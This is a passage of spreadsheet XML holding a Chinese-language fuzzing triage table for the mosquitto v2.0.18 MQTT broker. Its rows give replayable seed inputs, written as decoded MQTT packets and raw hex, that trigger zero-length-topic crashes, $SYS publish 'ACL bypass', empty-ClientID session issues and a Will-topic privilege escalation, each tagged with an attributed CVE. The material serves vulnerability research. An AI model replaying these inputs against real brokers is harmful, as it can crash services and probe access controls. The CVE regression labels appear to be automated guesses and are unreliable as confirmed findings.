        <f>== 种子标识: id:000009,sev:4,cat:01c1 ===\u000a大小: 984B (报告+请求数据)\u000a请求数据: 73B\u000a\u000a---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MQTT请求序列(73B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=8 Topics=['$share/grp1/#'(QoS=0), '$SYS/broker/version'(QoS=0), ''(零长度!QoS=0)] | raw_header=822b0008000d2473686172652f677270\u000aMsg[2]: PUBLISH Topic='$share/grp1/#' QoS=1 retain=True payload='\x00\u0009\x88zÊ\u000a|ï\x84\x93' | raw_header=3319000d2473686172652f677270312f\u000aMsg[3]: CONNECT  | raw_header=14</f>
        <v/>
      </c>
      <c r="F2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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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48">
      <c r="A248" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B248" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C248" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(179B)\u000a4.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248" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c3 ===\u000a大小: 1237B (报告+请求数据)\u000a请求数据: 179B\u000a\u000a---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MQTT请求序列(179B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='ket_fuz' | raw_header=3116000d746573742f72657461696e65\u000aMsg[2]: SUBSCRIBE PacketID=18 Topics=[''(零长度!QoS=0)] | raw_header=8222001200001c2473686172652f6733\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=74B | raw_header=3c5f0013245359532f62726f6b65722f\u000aMsg[4]: PUBREC PacketID=30569 | raw_header=570a77696c6c2f746f706963\u000aMsg[5]: TYPE0  | raw_header=000877696c6c5f6d7367</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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49">
      <c r="A249" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B249" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C249" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(34B)\u000a4.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49" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 631B (报告+请求数据)\u000a请求数据: 34B\u000a\u000a---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MQTT请求序列(34B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v242 ClientID=''(1887B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d515454f202003c00075f75\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=1), ''(零长度!QoS=1)] | raw_header=820b0001000031000001000674</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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4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0">
      <c r="A250" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B250" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C250" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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50" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 849B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(65B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='fld\Z\x7f\x04'(7B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c0007666c\u000aMsg[2]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='keep_me' | raw_header=3116000d746573742f72657461696e65\u000aMsg[3]: SUBSCRIBE PacketID=2 Topics=[''(零长度!QoS=0)] | raw_header=8212000200000003e8742f7265746169</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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1">
      <c r="A251" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_4.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B251" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C251" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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251" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 988B (报告+请求数据)\u000a请求数据: 114B\u000a\u000a---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MQTT请求序列(114B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=19 Topics=['$share/g3/home/+/temperature'(QoS=0), ''(零长度!QoS=2), 'sensor/temp'(QoS=2)] | raw_header=82320013001c2473686172652f67332f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload='aÎ\x87\x7f|¦õ&gt;,\x08z·\x1f" «éñ\x92\x87'\u00adÔï\x19ï¤¶âÒ]D äÃ\x1c\x8a¸' | raw_header=313b0013245359532f62726f6b65722f\u000aMsg[3]: SUBACK  | raw_header=97</f>
        <v/>
      </c>
      <c r="F2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51" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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5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52">
      <c r="A252" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000004,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B252" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C252" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000004,sev:3,cat:0101)中的REQUEST DATA提取出来(77B)\u000a4.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252" s="2">
        <f>== 种子标识: id:000004,sev:3,cat:0101 ===\u000a大小: 603B (报告+请求数据)\u000a请求数据: 77B\u000a\u000a---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MQTT请求序列(77B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=False keepalive=14s Will=YES [持久会话] | raw_header=101500044d51545404e4000e00002c01\u000aMsg[2]: SUBSCRIBE  | raw_header=8000\u000aMsg[3]: (不完整,52B) raw=73742f23003412000974657374e01994171133abfbe3260000000a746573742f746f7069631c0000\u000a(尾部52B): 73742f23003412000974657374e01994171133abfbe3260000000a746573742f746f7069631c00000000000132000268655e</f>
        <v/>
      </c>
      <c r="F2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5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52" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J25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5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53">
      <c r="A253" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000005,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B253" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C253" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(74B)\u000a4.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53" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0040 ===\u000a大小: 450B (报告+请求数据)\u000a请求数据: 74B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(74B原始二进制) ---\u000aMsg[1]: (不完整,74B) raw=8282050745000000322b00142473686172652f677270322f73656e736f722f230746c1885b9b7d1b\u000a(尾部74B): 8282050745000000322b00142473686172652f677270322f73656e736f722f230746c1885b9b7d1bf17d8f053ce8ed2a617a</f>
        <v/>
      </c>
      <c r="F2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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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4">
      <c r="A254" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000005,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B254" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C254" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(65B)\u000a4.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4" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:00c0 ===\u000a大小: 628B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(65B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=820b0000000000000000000000\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: PUBLISH Topic='$share/grp1/#' QoS=1 retain=True payload='\x08'\u000d\u0009Sy¾æ*Å\x0fÑåØR' | raw_header=3b1e000d2473686172652f677270312f\u000aMsg[8]: TYPE0  | raw_header=0100\u000aMsg[9]: (不完整,8B) raw=06746573742f2300\u000a(尾部8B): 06746573742f2300</f>
        <v/>
      </c>
      <c r="F2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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J25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5">
      <c r="A255" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000005,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B255" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C255" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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将种子文件(id:000005,sev:4,cat:02c4)中的REQUEST DATA提取出来(82B)\u000a4.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55" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:02c4 ===\u000a大小: 808B (报告+请求数据)\u000a请求数据: 82B\u000a\u000a---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MQTT请求序列(82B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=506 Topics=['$share/g3/home/+/temperature'(QoS=0), ''(零长度!QoS=1)] | raw_header=822401fa001c2473686172652f67332f\u000aMsg[2]: PUBLISH Topic='$share/grp1/#' QoS=1 retain=True payload='\x01û\x01ÜÄ4_µ`3\x80&gt;cÀ' | raw_header=331d000d2473686172652f677270312f\u000aMsg[3]: SUBSCRIBE PacketID=13 Topics=[] | raw_header=820b000d74775d742f232f2300</f>
        <v/>
      </c>
      <c r="F2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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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6">
      <c r="A256" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000006,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B256" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C256" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(89B)\u000a4.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56" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0002 ===\u000a大小: 413B (报告+请求数据)\u000a请求数据: 89B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(89B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['test/\x06'(QoS=0)] | raw_header=820b00010006746573742f0600\u000aMsg[2]: SUBSCRIBE PacketID=4041 Topics=['$share/grp1/#'(QoS=2), '+/data'(QoS=1), '+/data'(QoS=0)] | raw_header=82240fc9000d2473686172652f677270\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload='\x0fÊèqÖ' | raw_header=3224001d245359532f62726f6b65722f</f>
        <v/>
      </c>
      <c r="F2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56" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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5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57">
      <c r="A257" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000006,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B257" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C257" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(269B)\u000a4.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257" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0101 ===\u000a大小: 796B (报告+请求数据)\u000a请求数据: 269B\u000a\u000a---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MQTT请求序列(269B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v130 ClientID='$share/grp1/test/+'(18B) clean_session=False keepalive=63s [持久会话] | raw_header=104100044d5154548218003f00001224\u000aMsg[2]: CONNACK  | raw_header=2600\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1c2473686172652f67332f686f6d652f\u000aMsg[4]: CONNACK session_present=92 reason_code=158 | raw_header=2f655c9eb82de1110ea5fda6c5723236\u000aMsg[5]: (不完整,59B) raw=9d5f706173738204002d0000018218002e00136018622fe32f712f652f662f672f682f692f73001f\u000a(尾部59B): 9d5f706173738204002d0000018218002e00136018622fe32f712f652f662f672f682f692f73001f1235091e3069900203b4</f>
        <v/>
      </c>
      <c r="F2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5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57" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J25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5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58">
      <c r="A258" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000006,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B258" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C258" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(254B)\u000a4.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58" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0040 ===\u000a大小: 4726B (报告+请求数据)\u000a请求数据: 254B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(254B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='client_01'(9B) clean_session=True keepalive=60s Will=YES WillTopic='will/topic' [自动清理会话] | raw_header=104100044d51545404c6003c0009636c\u000aMsg[2]: SUBSCRIBE PacketID=45 Topics=[''(零长度!QoS=2)] | raw_header=8205002d000002\u000aMsg[3]: SUBSCRIBE PacketID=46 Topics=['a/b/c//\x82*\x00D\x00\x00\u000d$shar'(QoS=1)] | raw_header=8218002e0013612f622f632f2f822a00\u000aMsg[4]: CONNACK session_present=114 reason_code=112 | raw_header=2f677270312f23060014247368617265\u000aMsg[5]: (不完整,49B) raw=43a5b60ad675b9640d0c2ebd82b9de12ff01751694bce76a00a209002f00052b2f2b2f2b35090001\u000a(尾部49B): 43a5b60ad675b9640d0c2ebd82b9de12ff01751694bce76a00a209002f00052b2f2b2f2b3509000123003000010203e000</f>
        <v/>
      </c>
      <c r="F2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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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59">
      <c r="A259" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000006,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B259" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C259" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(127B)\u000a4.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9" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c0 ===\u000a大小: 691B (报告+请求数据)\u000a请求数据: 127B\u000a\u000a---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MQTT请求序列(127B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(256B) clean_session=True keepalive=2816s [自动清理会话] | raw_header=104100044d51545404820b0001000674\u000aMsg[2]: SUBSCRIBE PacketID=45 Topics=[''(零长度!QoS=3)] | raw_header=8205002d000003\u000aMsg[3]: SUBSCRIBE PacketID=46 Topics=['a/b/c/d/+/f/g/h/i/j'(QoS=0)] | raw_header=8218002e0013612f622f632f642f2b2f\u000aMsg[4]: UNSUBSCRIBE  | raw_header=a209002f00052b2f2b2f2b\u000aMsg[5]: PUBLISH Topic='#' QoS=2 retain=True payload='\x00/f/0\x00' | raw_header=3509000123002f662f3000\u000aMsg[6]: TYPE0  | raw_header=010103\u000aMsg[7]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F2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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J25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5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0">
      <c r="A260" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000006,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B260" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C260" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(375B)\u000a4.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60" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0244 ===\u000a大小: 915B (报告+请求数据)\u000a请求数据: 375B\u000a\u000a---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MQTT请求序列(375B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='client_01'(9B) clean_session=True keepalive=60s Will=YES WillTopic='wi\x82W\x00\x01G\x0b\x9eä' [自动清理会话] | raw_header=104100044d51545404c6003c0009636c\u000aMsg[2]: PUBREL PacketID=12148 | raw_header=65702f746f7069632f6c6576656c312f\u000aMsg[3]: PUBREL PacketID=29 | raw_header=6526001d245359532f62726f6b65722f\u000aMsg[4]: PUBCOMP PacketID=29797 | raw_header=722f74656d700e512b927037d8eb7863\u000aMsg[5]: TYPE0  | raw_header=000966757a7a5f70617373\u000aMsg[6]: SUBSCRIBE PacketID=45 Topics=[] | raw_header=8205002d617373\u000aMsg[7]: SUBSCRIBE PacketID=45 Topics=[''(零长度!QoS=0)] | raw_header=8205002d000000\u000aMsg[8]: CONNACK session_present=130 reason_code=24 | raw_header=22028218\u000aMsg[9]: TYPE0  | raw_header=002e00f8602f6201632f642f652f4d2f\u000aMsg[10]: (不完整,28B) raw=c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c20030000102036af6\u000a(尾部28B): c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c2c20030000102036af6</f>
        <v/>
      </c>
      <c r="F2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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J2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6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1">
      <c r="A261" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B261" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C261" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(99B)\u000a4.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61" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 595B (报告+请求数据)\u000a请求数据: 99B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(99B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=88 Topics=['#'(QoS=2), '+/data'(QoS=1), '#'(QoS=1)] | raw_header=821300580001230200062b2f64617461\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=51B | raw_header=34480013245359532f62726f6b65722f\u000aMsg[3]: (不完整,4B) raw=741d2c06\u000a(尾部4B): 741d2c06</f>
        <v/>
      </c>
      <c r="F2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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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62">
      <c r="A262" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B262" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C262" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(209B)\u000a4.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62" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 893B (报告+请求数据)\u000a请求数据: 209B\u000a\u000a---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MQTT请求序列(209B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='\x82&gt;\x00D\x00\x00\x12home/+/temperatur'(24B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102400044d5154540402003c0018823e\u000aMsg[2]: PUBREL PacketID=13 | raw_header=6526000d2473686172652f677270312f\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=65B | raw_header=3d60001d245359532f62726f6b65722f\u000aMsg[4]: (不完整,33B) raw=414141414141414141414141414141414141414141414141c0c000c000c0c0e000\u000a(尾部33B): 414141414141414141414141414141414141414141414141c0c000c000c0c0e000</f>
        <v/>
      </c>
      <c r="F2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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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63">
      <c r="A263" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B263" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C263" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(80B)\u000a4.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63" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 626B (报告+请求数据)\u000a请求数据: 80B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(80B原始二进制) ---\u000aMsg[1]: CONNECT Proto=\x00\x06te v115 ClientID=''(0B) clean_session=False keepalive=12132s Will=YES [持久会话] | raw_header=101300040006746573742f640000006f\u000aMsg[2]: PUBCOMP  | raw_header=750100\u000aMsg[3]: TYPE0  | raw_header=0100\u000aMsg[4]: TYPE0  | raw_header=06106573742f2300800d001774657374\u000aMsg[5]: (不完整,36B) raw=68656c6c6f940f0006746573742f640000006f726c644002007f000070020006c000ff00\u000a(尾部36B): 68656c6c6f940f0006746573742f640000006f726c644002007f000070020006c000ff00</f>
        <v/>
      </c>
      <c r="F2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6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63" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J26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6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64">
      <c r="A264" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:3,cat:0102</t>
        </is>
      </c>
      <c r="B264" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C264" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(68B)\u000a4.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64" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0102 ===\u000a大小: 708B (报告+请求数据)\u000a请求数据: 68B\u000a\u000a---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MQTT请求序列(68B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=52s Will=YES WillTopic='$SYS/broker/clients/connected' [自动清理会话] | raw_header=103900044d515454040e00340000001d\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: PUBACK  | raw_header=4000\u000aMsg[4]: (不完整,5B) raw=ff7bc18105\u000a(尾部5B): ff7bc18105</f>
        <v/>
      </c>
      <c r="F2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6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64" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J26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26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65">
      <c r="A265" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B265" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C265" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D2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DATA提取出来(148B)\u000a4.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265" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0206 ===\u000a大小: 786B (报告+请求数据)\u000a请求数据: 148B\u000a\u000a---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MQTT请求序列(148B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=9 | raw_header=621500094d515480ff000961666c6e65\u000aMsg[2]: SUBSCRIBE PacketID=20 Topics=['$share/grp2/sensor/#'(QoS=0)] | raw_header=8219001400142473686172652f677270\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=58B | raw_header=3c4f0013245359532f62726f6b65722f\u000aMsg[4]: (不完整,17B) raw=74658a742f716f7332000068656c6c6f02\u000a(尾部17B): 74658a742f716f7332000068656c6c6f02</f>
        <v/>
      </c>
      <c r="F2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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J2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66">
      <c r="A266" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_5.tar.gz/replayable-violations/id:000007,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B266" s="2" t="inlineStr">
        <is>
